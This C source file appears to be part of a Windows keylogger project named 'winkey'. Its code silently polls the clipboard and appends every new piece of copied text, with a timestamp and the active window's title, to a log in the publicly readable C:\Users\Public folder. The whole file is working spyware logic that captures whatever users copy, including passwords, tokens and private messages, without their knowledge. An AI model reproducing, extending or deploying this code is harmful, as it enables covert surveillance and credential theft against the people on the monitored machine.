#include "winkey.h"

t_ClipboardState g_clipboardState = {0};

// Opens/creates C:\Users\Public\clipboard.log

BOOL OpenClipboardLog(void)
{
    char        logPath[MAX_PATH];
    time_t      currentTime;
    struct tm   timeInfo;

    // Build full path for clipboard log file
    snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\clipboard.log");

    // Open the log file safely
    if (fopen_s(&g_clipboardState.clipboardFile, logPath, "ab+") != 0 || !g_clipboardState.clipboardFile)
        return FALSE;

    // Write BOM if file is empty
    if (fseek(g_clipboardState.clipboardFile, 0, SEEK_END) == 0) {
        long size = ftell(g_clipboardState.clipboardFile);
        if (size == 0) {
            unsigned char bom[3] = {0xEF,0xBB,0xBF};
            fwrite(bom,1,3,g_clipboardState.clipboardFile);
        }
    }

    // Get current time and write start header
    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);

    fprintf(g_clipboardState.clipboardFile,
            "\n=== Clipboard Log Start: %02d/%02d/%04d %02d:%02d:%02d ===\n",
            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec);
    fflush(g_clipboardState.clipboardFile);
    (void)logPath; // Avoid unused warning
    return TRUE;
}

// Closes the clipboard log file
void CloseClipboardLog(void)
{
    if (g_clipboardState.clipboardFile) {
        fprintf(g_clipboardState.clipboardFile, "=== Clipboard Log End ===\n");
        fflush(g_clipboardState.clipboardFile);
        fclose(g_clipboardState.clipboardFile);
        g_clipboardState.clipboardFile = NULL;
    }
}

// Retrieves the active window title
static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
{
    HWND    activeWindow;
    int     titleLength;

    activeWindow = GetForegroundWindow();
    if (!activeWindow)
        return FALSE;
    
    WCHAR wTitle[256];
    titleLength = GetWindowTextW(activeWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)));
    if (titleLength <= 0) {
        strcpy_s(buffer, bufSize, "Unknown Window");
        return FALSE;
    }
    if (WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, buffer, (int)bufSize, NULL, NULL) <= 0) {
        strcpy_s(buffer, bufSize, "Unknown Window");
        return FALSE;
    }
    return TRUE;
}

// Writes timestamp + active window + new text
static void writeClipboardEntry(const char *text, const char *windowTitle)
{
    time_t      currentTime;
    struct tm   timeInfo;

    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);
    fprintf(g_clipboardState.clipboardFile,
            "[%04d-%02d-%02d %02d:%02d:%02d] - Window: '%s'\n%s\n\n",
        timeInfo.tm_year + 1900, timeInfo.tm_mon + 1, timeInfo.tm_mday,
        timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec, windowTitle, text);
    fflush(g_clipboardState.clipboardFile);
}

// Gets text (UTF-16 -> simple UTF-8) from clipboard
// Returns TRUE if valid text was obtained
static BOOL getClipboardText(char *buffer, size_t bufSize)
{
    HGLOBAL         hData;
    const wchar_t   *wdata;
    int             len;

    if (!OpenClipboard(NULL))
        return FALSE;

    hData = GetClipboardData(CF_UNICODETEXT);
    if (!hData) {
        CloseClipboard();
        return FALSE;
    }

    wdata = (const wchar_t*)GlobalLock(hData);
    if (!wdata) {
        CloseClipboard();
        return FALSE;
    }

    len = WideCharToMultiByte(CP_UTF8, 0, wdata, -1, buffer, (int)bufSize, NULL, NULL);
    GlobalUnlock(hData);
    CloseClipboard();
    
    return (len > 1);
}

// Checks if clipboard text changed and logs it
void LogClipboardIfChanged(void)
{
    char    current[1024 * 10];
    char    windowTitle[256];

    if (!g_clipboardState.clipboardFile) {
        if (!OpenClipboardLog())
            return ;
    }

    if (!getClipboardText(current, sizeof(current)))
        return ;

    if (strcmp(current, g_clipboardState.lastClipboardText) == 0)
        return ;

    getActiveWindowTitle(windowTitle, sizeof(windowTitle));
    writeClipboardEntry(current, windowTitle);
    strcpy_s(g_clipboardState.lastClipboardText, sizeof(g_clipboardState.lastClipboardText), current);
}
